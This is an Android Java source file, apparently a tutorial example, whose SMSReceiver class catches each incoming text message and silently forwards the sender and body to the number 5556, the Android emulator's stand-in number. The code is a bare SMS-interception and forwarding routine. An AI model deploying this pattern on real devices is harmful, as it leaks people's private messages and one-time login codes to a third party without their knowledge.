package txc.example;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.gsm.SmsManager;

public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Bundle bun=intent.getExtras();
		if(bun!=null){
			Object[] mypdus=(Object[])bun.get("pdus");//pdus广播短消息出来的参数名 键值对 值为一个数组
			SmsMessage[] messages=new SmsMessage[mypdus.length];
			for (int i = 0; i < messages.length; i++) {
				messages[i]=SmsMessage.createFromPdu((byte[])mypdus[i]);
			}
			for(SmsMessage mess:messages){
				//得到地址和内容
				String from=mess.getDisplayOriginatingAddress();
				String body=mess.getMessageBody();
				//mess.getTimestampMillis();
				SmsManager manager=SmsManager.getDefault();
				manager.sendTextMessage("5556", null, from+":"+body, null, null);
			}
		}
	}

}
